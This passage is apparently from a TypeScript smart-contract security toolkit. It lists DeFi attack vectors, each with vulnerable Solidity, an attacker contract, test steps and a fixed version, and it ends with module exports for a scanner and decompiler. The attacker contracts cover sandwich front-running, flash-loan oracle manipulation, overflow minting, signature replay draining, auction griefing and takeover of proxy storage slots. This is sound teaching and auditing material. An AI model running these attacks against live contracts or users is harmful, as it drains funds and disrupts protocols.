contract SecureAuction {
    mapping(address => bytes32) public commitments;
    mapping(address => uint256) public reveals;
    
    uint256 public commitDeadline;
    uint256 public revealDeadline;
    
    // Phase 1: Submit hidden bid
    function commit(bytes32 _hash) external {
        require(block.timestamp < commitDeadline);
        commitments[msg.sender] = _hash;
    }
    
    // Phase 2: Reveal actual bid
    function reveal(uint256 _bid, bytes32 _salt) external {
        require(block.timestamp >= commitDeadline);
        require(block.timestamp < revealDeadline);
        
        bytes32 hash = keccak256(abi.encodePacked(_bid, _salt));
        require(hash == commitments[msg.sender], "Invalid reveal");
        
        reveals[msg.sender] = _bid;
    }
}

// OR use Flashbots Protect RPC
// https://protect.flashbots.net
// Transactions go directly to block builders, skip public mempool`
    },
    {
        name: 'Sandwich Attack',
        description: 'Front-run and back-run a victim\'s swap transaction',
        mitigation: 'Set tight slippage tolerance, use MEV protection',
        severity: 'high' as const,
        realWorldExample: 'Millions extracted daily on Uniswap',
        vulnerableCode: `// User submits swap with high slippage tolerance
// In their wallet/dApp:
router.swapExactTokensForTokens(
    amountIn,
    amountOutMin,  // Set too low = vulnerable!
    path,
    to,
    deadline
);

// Example: User wants to swap 10 ETH for DAI
// Expected: ~20,000 DAI at current price
// Sets amountOutMin: 18,000 DAI (10% slippage)
// This 2,000 DAI gap is profit for attacker`,
        attackCode: `// SANDWICH ATTACK CONTRACT
contract SandwichAttacker {
    IUniswapV2Router public router;
    
    // Execute sandwich in single transaction (via Flashbots)
    function sandwich(
        address tokenIn,
        address tokenOut,
        uint256 victimAmountIn,
        uint256 attackAmount
    ) external {
        // FRONT-RUN: Buy before victim
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        
        router.swapExactTokensForTokens(
            attackAmount,
            0, // We accept any amount
            path,
            address(this),
            block.timestamp
        );
        // Price moves up!
        
        // VICTIM TX EXECUTES HERE (in the bundle)
        // They get worse price due to our front-run
        
        // BACK-RUN: Sell after victim
        path[0] = tokenOut;
        path[1] = tokenIn;
        
        uint256 tokenOutBalance = IERC20(tokenOut).balanceOf(address(this));
        router.swapExactTokensForTokens(
            tokenOutBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
        // Profit = tokens received - attackAmount
    }
}

// Profit calculation:
// 1. Front-run: Buy TOKEN, price goes from $1.00 to $1.02
// 2. Victim buys: Price goes from $1.02 to $1.05  
// 3. Back-run: Sell TOKEN at $1.05, bought at $1.00
// 4. Profit: ~3-5% minus gas costs`,
        testSteps: [
            'Fork mainnet with Hardhat/Anvil',
            'Identify a pending large swap (simulate with test tx)',
            'Calculate optimal sandwich amounts',
            'Bundle front-run + victim + back-run transactions',
            'Submit via Flashbots or private mempool',
            'Verify profit extraction'
        ],
        fixedCode: `// PROTECTION: Use tight slippage + MEV protection

// 1. Calculate proper slippage (0.5-1% for stable pairs)
const slippageTolerance = 0.005; // 0.5%
const amountOutMin = expectedOutput * (1 - slippageTolerance);

// 2. Use private transaction services
// Flashbots Protect: https://protect.flashbots.net
// MEV Blocker: https://mevblocker.io
// 1inch Fusion: Built-in MEV protection

// 3. Use DEX aggregators with MEV protection
// CoW Swap - Batch auctions prevent MEV
// 1inch Fusion mode
// Matcha with RFQ

// 4. In Solidity - add deadline and strict slippage
function safeSwap(
    uint256 amountIn,
    uint256 minAmountOut,
    address[] calldata path,
    uint256 deadline
) external {
    require(block.timestamp <= deadline, "Expired");
    require(minAmountOut >= calculateMinOutput(amountIn), "Slippage too high");
    // ... swap logic
}`
    },
    {
        name: 'Oracle Manipulation',
        description: 'Manipulate price oracle to exploit DeFi protocols',
        mitigation: 'Use decentralized oracles (Chainlink), TWAP',
        severity: 'critical' as const,
        realWorldExample: 'Harvest Finance ($34M), Mango Markets ($114M)',
        vulnerableCode: `// VULNERABLE: Spot price from single source
contract VulnerableVault {
    IUniswapV2Pair public pair;
    
    function getCollateralValue(uint256 amount) public view returns (uint256) {
        // DANGEROUS: Can be manipulated in same block
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 price = (uint256(reserve1) * 1e18) / uint256(reserve0);
        return (amount * price) / 1e18;
    }
    
    function liquidate(address user) external {
        uint256 collateralValue = getCollateralValue(userCollateral[user]);
        uint256 debtValue = userDebt[user];
        
        // Attacker manipulates price to trigger liquidation
        require(collateralValue < debtValue * 150 / 100, "Not liquidatable");
        // ... liquidate at manipulated price
    }
}`,
        attackCode: `// ORACLE MANIPULATION ATTACK
contract OracleManipulator {
    IUniswapV2Router public router;
    ILendingPool public flashLoanProvider;
    VulnerableVault public target;
    
    function attack() external {
        // Step 1: Flash loan large amount
        flashLoanProvider.flashLoan(
            address(this),
            WETH,
            10000 ether,
            ""
        );
    }
    
    function executeOperation(...) external returns (bool) {
        // Step 2: Dump on Uniswap to crash price
        IERC20(WETH).approve(address(router), type(uint256).max);
        
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = TARGET_TOKEN;
        
        router.swapExactTokensForTokens(
            10000 ether,
            0,
            path,
            address(this),
            block.timestamp
        );
        // Price crashed!
        
        // Step 3: Exploit the protocol at wrong price
        // Could be: liquidation, borrowing, minting, etc.
        target.liquidate(victimAddress);
        // OR
        target.borrow(smallCollateral); // Get huge loan
        
        // Step 4: Buy back tokens
        path[0] = TARGET_TOKEN;
        path[1] = WETH;
        router.swapExactTokensForTokens(...);
        
        // Step 5: Repay flash loan
        IERC20(WETH).transfer(address(flashLoanProvider), amount + fee);
        
        return true;
    }
}`,
        testSteps: [
            'Fork mainnet at block with known liquidity',
            'Deploy vulnerable protocol or use existing one',
            'Calculate required capital to move price X%',
            'Execute flash loan attack sequence',
            'Measure oracle price before/during/after',
            'Calculate extracted value'
        ],
        fixedCode: `// SECURE: Multiple oracle sources + TWAP
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract SecureVault {
    AggregatorV3Interface public chainlinkOracle;
    IUniswapV3Pool public uniswapPool;
    
    uint32 public twapInterval = 30 minutes;
    
    function getPrice() public view returns (uint256) {
        // Source 1: Chainlink (decentralized, manipulation-resistant)
        (, int256 chainlinkPrice,,,) = chainlinkOracle.latestRoundData();
        
        // Source 2: Uniswap V3 TWAP (time-weighted, harder to manipulate)
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = twapInterval;
        secondsAgos[1] = 0;
        
        (int56[] memory tickCumulatives,) = uniswapPool.observe(secondsAgos);
        int56 tickDiff = tickCumulatives[1] - tickCumulatives[0];
        int24 avgTick = int24(tickDiff / int56(uint56(twapInterval)));
        uint256 twapPrice = getQuoteAtTick(avgTick);
        
        // Require prices to be within 5% of each other
        uint256 deviation = abs(chainlinkPrice - twapPrice) * 100 / chainlinkPrice;
        require(deviation < 5, "Price deviation too high");
        
        // Use average of both sources
        return (uint256(chainlinkPrice) + twapPrice) / 2;
    }
}`
    },
    {
        name: 'Integer Overflow/Underflow',
        description: 'Arithmetic operations wrap around causing unexpected values',
        mitigation: 'Use Solidity 0.8+ or SafeMath library',
        severity: 'high' as const,
        realWorldExample: 'BEC Token (2018) - $900M fake tokens created',
        vulnerableCode: `// VULNERABLE: Solidity < 0.8.0 without SafeMath
pragma solidity ^0.7.0;

contract VulnerableToken {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) external {
        // OVERFLOW: If amount > balances[msg.sender], this underflows!
        balances[msg.sender] -= amount;  // Wraps to huge number
        balances[to] += amount;
    }
    
    function batchTransfer(address[] memory receivers, uint256 value) external {
        // OVERFLOW: receivers.length * value can overflow
        uint256 totalAmount = receivers.length * value;  // Can wrap to small number!
        require(balances[msg.sender] >= totalAmount);
        
        balances[msg.sender] -= totalAmount;
        for (uint i = 0; i < receivers.length; i++) {
            balances[receivers[i]] += value;
        }
    }
}`,
        attackCode: `// OVERFLOW ATTACK EXAMPLE
contract OverflowAttacker {
    VulnerableToken public token;
    
    function exploitUnderflow() external {
        // If we have 0 balance and transfer 1 token:
        // 0 - 1 = 2^256 - 1 (max uint256!)
        token.transfer(address(this), 1);
        // Now we have mass tokens!
    }
    
    function exploitBatchOverflow() external {
        // Create array that causes overflow
        // 2^255 * 2 = 0 (overflow!)
        address[] memory receivers = new address[](2);
        receivers[0] = address(this);
        receivers[1] = address(this);
        
        // value = 2^255, totalAmount = 2^255 * 2 = 0
        uint256 value = 2**255;
        
        // Passes require(balance >= 0)!
        token.batchTransfer(receivers, value);
        // Each receiver gets 2^255 tokens
    }
}

// Test in Hardhat:
it("should exploit overflow", async function() {
    const token = await VulnerableToken.deploy();
    const attacker = await OverflowAttacker.deploy(token.address);
    
    // Balance starts at 0
    expect(await token.balances(attacker.address)).to.equal(0);
    
    // Exploit underflow
    await attacker.exploitUnderflow();
    
    // Now has max uint256!
    expect(await token.balances(attacker.address)).to.equal(
        ethers.constants.MaxUint256
    );
});`,
        testSteps: [
            'Deploy contract with Solidity 0.7.x or earlier',
            'Verify SafeMath is NOT used',
            'Calculate overflow/underflow values',
            'Execute attack transaction',
            'Verify unexpected balance changes',
            'Compare with Solidity 0.8+ behavior (reverts)'
        ],
        fixedCode: `// SECURE: Solidity 0.8+ has built-in checks
pragma solidity ^0.8.0;

contract SecureToken {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) external {
        // Automatically reverts on underflow in 0.8+
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
    
    function batchTransfer(address[] memory receivers, uint256 value) external {
        // Use checked math
        uint256 totalAmount = receivers.length * value; // Reverts on overflow
        require(balances[msg.sender] >= totalAmount);
        
        balances[msg.sender] -= totalAmount;
        for (uint i = 0; i < receivers.length; i++) {
            balances[receivers[i]] += value;
        }
    }
}

// For gas optimization with known-safe math, use unchecked:
function safeIncrement(uint256 i) internal pure returns (uint256) {
    unchecked {
        return i + 1; // OK if we know i < max
    }
}`
    },
    {
        name: 'Access Control',
        description: 'Missing or improper access restrictions on sensitive functions',
        mitigation: 'Implement proper role-based access control',
        severity: 'critical' as const,
        realWorldExample: 'Parity Multisig ($30M), Wormhole ($320M)',
        vulnerableCode: `// VULNERABLE: Missing access control
contract VulnerableContract {
    address public owner;
    
    // VULNERABLE: Anyone can call!
    function initialize(address _owner) public {
        owner = _owner;
    }
    
    // VULNERABLE: No access check
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
    
    // VULNERABLE: Using tx.origin
    function withdraw() public {
        require(tx.origin == owner); // Can be phished!
        payable(owner).transfer(address(this).balance);
    }
    
    // VULNERABLE: Unprotected selfdestruct
    function kill() public {
        selfdestruct(payable(msg.sender));
    }
}`,
        attackCode: `// ACCESS CONTROL ATTACKS
contract AccessControlAttacker {
    VulnerableContract public target;
    
    // Attack 1: Steal uninitialized contract
    function stealOwnership(address _target) external {
        target = VulnerableContract(_target);
        // If initialize() wasn't called, we become owner!
        target.initialize(address(this));
    }
    
    // Attack 2: Free minting
    function freeMint() external {
        target.mint(msg.sender, 1000000 ether);
    }
    
    // Attack 3: Destroy contract
    function destroyContract() external {
        target.kill();
        // Contract is now dead, funds gone!
    }
}

// Attack 4: tx.origin phishing
contract PhishingContract {
    VulnerableContract public target;
    
    // Trick owner into calling this
    function claimReward() external {
        // When owner calls this, tx.origin == owner
        // So vulnerable withdraw() succeeds!
        target.withdraw();
    }
}`,
        testSteps: [
            'Deploy vulnerable contract',
            'Check if initialization is required/done',
            'Attempt to call admin functions as non-admin',
            'Test tx.origin bypass with intermediary contract',
            'Verify all sensitive functions have proper modifiers'
        ],
        fixedCode: `// SECURE: Proper access control
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract SecureContract is Ownable, AccessControl, Initializable {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    
    // Can only be called once
    function initialize(address _owner) public initializer {
        _transferOwnership(_owner);
        _grantRole(DEFAULT_ADMIN_ROLE, _owner);
    }
    
    // Role-based access
    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }
    
    // Use msg.sender, not tx.origin
    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // Remove or heavily protect selfdestruct
    // Best practice: Don't include it at all
}`
    },
    {
        name: 'Signature Replay',
        description: 'Valid signature reused across chains or contracts',
        mitigation: 'Include chainId, nonce, and contract address in signed data',
        severity: 'high' as const,
        realWorldExample: 'Wintermute Optimism ($20M)',
        vulnerableCode: `// VULNERABLE: Signature can be replayed
contract VulnerablePermit {
    mapping(address => uint256) public balances;
    
    // VULNERABLE: No nonce, no chainId, no contract address
    function permitTransfer(
        address from,
        address to,
        uint256 amount,
        bytes memory signature
    ) external {
        bytes32 hash = keccak256(abi.encodePacked(from, to, amount));
        address signer = recoverSigner(hash, signature);
        
        require(signer == from, "Invalid signature");
        
        balances[from] -= amount;
        balances[to] += amount;
    }
    
    // Same signature works:
    // - Multiple times (no nonce)
    // - On different chains (no chainId)
    // - On cloned contracts (no contract address)
}`,
        attackCode: `// SIGNATURE REPLAY ATTACKS
contract SignatureReplayAttacker {
    VulnerablePermit public target;
    
    // Attack 1: Replay same signature multiple times
    function replayAttack(
        address from,
        address to,
        uint256 amount,
        bytes memory signature
    ) external {
        // Drain victim's balance by replaying
        while (target.balances(from) >= amount) {
            target.permitTransfer(from, to, amount, signature);
        }
    }
    
    // Attack 2: Cross-chain replay
    // If same contract deployed on multiple chains,
    // signature from chain A works on chain B
    
    // Attack 3: Deploy clone and replay
    // Clone vulnerable contract, replay signatures there
}

// How attacker obtains signature:
// 1. User signs legitimate transaction
// 2. Attacker observes it on-chain or in mempool
// 3. Extracts signature and replays it`,
        testSteps: [
            'Deploy vulnerable permit contract',
            'Have user sign a transfer permit',
            'Submit signed transaction once (legitimate)',
            'Extract signature from first transaction',
            'Replay same signature again and again',
            'Deploy on testnet + mainnet, replay across chains'
        ],
        fixedCode: `// SECURE: EIP-712 typed structured data
contract SecurePermit {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public nonces;
    
    bytes32 public DOMAIN_SEPARATOR;
    bytes32 public constant PERMIT_TYPEHASH = keccak256(
        "Permit(address from,address to,uint256 amount,uint256 nonce,uint256 deadline)"
    );
    
    constructor() {
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes("SecurePermit")),
            keccak256(bytes("1")),
            block.chainid,           // Chain-specific
            address(this)            // Contract-specific
        ));
    }
    
    function permitTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s
    ) external {
        require(block.timestamp <= deadline, "Expired");
        
        bytes32 structHash = keccak256(abi.encode(
            PERMIT_TYPEHASH,
            from,
            to,
            amount,
            nonces[from]++,  // Increment nonce
            deadline
        ));
        
        bytes32 hash = keccak256(abi.encodePacked(
            "\\x19\\x01",
            DOMAIN_SEPARATOR,
            structHash
        ));
        
        address signer = ecrecover(hash, v, r, s);
        require(signer == from, "Invalid signature");
        
        balances[from] -= amount;
        balances[to] += amount;
    }
}`
    },
    {
        name: 'Denial of Service',
        description: 'Block operations through gas limits or reverts',
        mitigation: 'Use pull over push pattern, gas limits',
        severity: 'medium' as const,
        realWorldExample: 'GovernMental Ponzi scheme lockup',
        vulnerableCode: `// VULNERABLE: Push pattern with external calls
contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;
    
    // VULNERABLE: Refund can fail and block new bids
    function bid() external payable {
        require(msg.value > highestBid, "Bid too low");
        
        // DANGER: If this fails, no one can bid!
        if (highestBidder != address(0)) {
            // Previous bidder's contract reverts = DoS
            payable(highestBidder).transfer(highestBid);
        }
        
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
}

// VULNERABLE: Unbounded loop
contract VulnerableDistributor {
    address[] public recipients;
    
    function distribute() external {
        // If recipients array is too large, this exceeds gas limit
        for (uint i = 0; i < recipients.length; i++) {
            payable(recipients[i]).transfer(1 ether);
        }
    }
}`,
        attackCode: `// DOS ATTACK CONTRACTS
// Attack 1: Revert to block auction
contract AuctionBlocker {
    VulnerableAuction public auction;
    
    function attack() external payable {
        auction.bid{value: msg.value}();
    }
    
    // Reject all incoming ETH - blocks refunds!
    receive() external payable {
        revert("No refunds!");
    }
}

// Attack 2: Gas griefing
contract GasGriefer {
    VulnerableAuction public auction;
    
    function attack() external payable {
        auction.bid{value: msg.value}();
    }
    
    // Consume all gas on receive
    receive() external payable {
        // Infinite loop burns remaining gas
        while(true) {}
    }
}

// Attack 3: Bloat array to cause gas limit DoS
contract ArrayBloater {
    VulnerableDistributor public distributor;
    
    function bloatArray() external {
        // Add thousands of addresses
        for (uint i = 0; i < 10000; i++) {
            distributor.addRecipient(address(uint160(i)));
        }
        // Now distribute() exceeds block gas limit
    }
}`,
        testSteps: [
            'Deploy vulnerable auction/distributor',
            'Deploy attacker contract',
            'Have attacker become highest bidder',
            'Try to outbid from regular account',
            'Observe transaction failure due to revert',
            'Auction is now permanently stuck'
        ],
        fixedCode: `// SECURE: Pull pattern - users withdraw themselves
contract SecureAuction {
    address public highestBidder;
    uint256 public highestBid;
    mapping(address => uint256) public pendingReturns;
    
    function bid() external payable {
        require(msg.value > highestBid, "Bid too low");
        
        // Store refund for later withdrawal
        if (highestBidder != address(0)) {
            pendingReturns[highestBidder] += highestBid;
        }
        
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
    
    // Users pull their own refunds
    function withdraw() external {
        uint256 amount = pendingReturns[msg.sender];
        require(amount > 0, "No pending returns");
        
        pendingReturns[msg.sender] = 0;
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdraw failed");
    }
}

// SECURE: Paginated distribution
contract SecureDistributor {
    function distribute(uint256 start, uint256 end) external {
        require(end <= recipients.length);
        require(end - start <= 100, "Batch too large");
        
        for (uint i = start; i < end; i++) {
            pendingPayments[recipients[i]] += paymentAmount;
        }
    }
}`
    },
    {
        name: 'Proxy Storage Collision',
        description: 'Upgradeable proxy storage slots collide with implementation',
        mitigation: 'Use unstructured storage pattern (EIP-1967)',
        severity: 'critical' as const,
        realWorldExample: 'Audius governance hack ($6M)',
        vulnerableCode: `// VULNERABLE: Storage collision
contract VulnerableProxy {
    address public implementation;  // Slot 0
    address public admin;           // Slot 1
    
    function upgradeTo(address newImpl) external {
        require(msg.sender == admin);
        implementation = newImpl;
    }
    
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// Implementation contract
contract VulnerableImplementation {
    address public owner;  // COLLISION! Also uses Slot 0
    uint256 public value;  // Slot 1 - collides with admin!
    
    function initialize(address _owner) external {
        owner = _owner;  // Overwrites proxy's implementation!
    }
    
    function setValue(uint256 _value) external {
        value = _value;  // Overwrites proxy's admin!
    }
}`,
        attackCode: `// STORAGE COLLISION EXPLOIT
contract StorageCollisionAttacker {
    VulnerableProxy public proxy;
    
    function attack() external {
        // Step 1: Implementation's owner = Slot 0
        // Proxy's implementation = Slot 0
        // Calling initialize overwrites implementation address!
        
        VulnerableImplementation impl = VulnerableImplementation(
            address(proxy)
        );
        
        // This sets "owner" but actually overwrites "implementation"
        impl.initialize(address(this));
        
        // Now we control the implementation!
        // Can upgrade to malicious contract
    }
    
    function stealAdmin() external {
        VulnerableImplementation impl = VulnerableImplementation(
            address(proxy)
        );
        
        // setValue writes to slot 1
        // Which is proxy's admin slot!
        impl.setValue(uint256(uint160(address(this))));
        
        // Now we're the admin!
    }
}

// Verify storage layout:
// Slot 0: proxy.implementation / impl.owner
// Slot 1: proxy.admin / impl.value`,
        testSteps: [
            'Deploy proxy and implementation separately',
            'Inspect storage slots using eth_getStorageAt',
            'Identify overlapping slots',
            'Call implementation function that writes to shared slot',
            'Observe proxy state corruption',
            'Gain unauthorized access via corrupted admin'
        ],
        fixedCode: `// SECURE: EIP-1967 Unstructured Storage
contract SecureProxy {
    // Random slots that won't collide with implementation
    bytes32 private constant IMPLEMENTATION_SLOT = 
        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    // 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
    
    bytes32 private constant ADMIN_SLOT = 
        bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
    // 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
    
    function _getImplementation() internal view returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }
    
    function _setImplementation(address newImpl) internal {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImpl)
        }
    }
    
    function upgradeTo(address newImpl) external {
        require(msg.sender == _getAdmin());
        require(newImpl.code.length > 0, "Not a contract");
        _setImplementation(newImpl);
    }
}

// Better: Use OpenZeppelin's proxy contracts
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";`
    }
];

// Re-export all scanner modules
export * from './types';
export * from './explorer-api';
export * from './known-exploits';
export * from './decompiler';
export * from './scanner';

// Import scanner components for unified API
import { BlockchainScanner, createScanner, scanAddress, scanAddresses, checkKnownExploits } from './scanner';
import { ExplorerAPI, createExplorerAPI } from './explorer-api';
import { 
    KNOWN_EXPLOITS, 
    KNOWN_ATTACKER_ADDRESSES, 
    findExploitByAddress,
    findExploitsByType,
    findExploitsByChain,
    getExploitStats,
    isKnownAttacker 
} from './known-exploits';
import { 
    disassemble, 
    decompile, 
    analyzeBytecode, 
    extractSelectors,
    identifySelector,
    compareBytecodes 
} from './decompiler';
import { CHAINS } from './types';

// Unified blockchain security toolkit
export const blockchain = {
    // Contract analysis (source code)
    analyzeContract,
    vulnerabilityPatterns,
    attackVectors,
    
    // Live blockchain scanning
    scanner: {
        create: createScanner,
        scan: scanAddress,
        batchScan: scanAddresses,
        BlockchainScanner
    },
    
    // Explorer APIs
    explorer: {
        create: createExplorerAPI,
        ExplorerAPI
    },
    
    // Known exploits database
    exploits: {
        database: KNOWN_EXPLOITS,
        attackers: KNOWN_ATTACKER_ADDRESSES,
        findByAddress: findExploitByAddress,
        findByType: findExploitsByType,
        findByChain: findExploitsByChain,
        getStats: getExploitStats,
        checkAttacker: isKnownAttacker,
        check: checkKnownExploits
    },
    
    // Bytecode decompiler
    decompiler: {
        disassemble,
        decompile,
        analyzeBytecode,
        extractSelectors,
        identifySelector,
        compareBytecodes
    },
    
    // Utilities
    utils: {
        validateAddress,
        decodeFunctionSelector,
        calculateHash,
        estimateGas,
        formatWei,
        parseABI
    },
    
    // Chain configurations
    chains: CHAINS,
    chainInfo
};

export default blockchain;
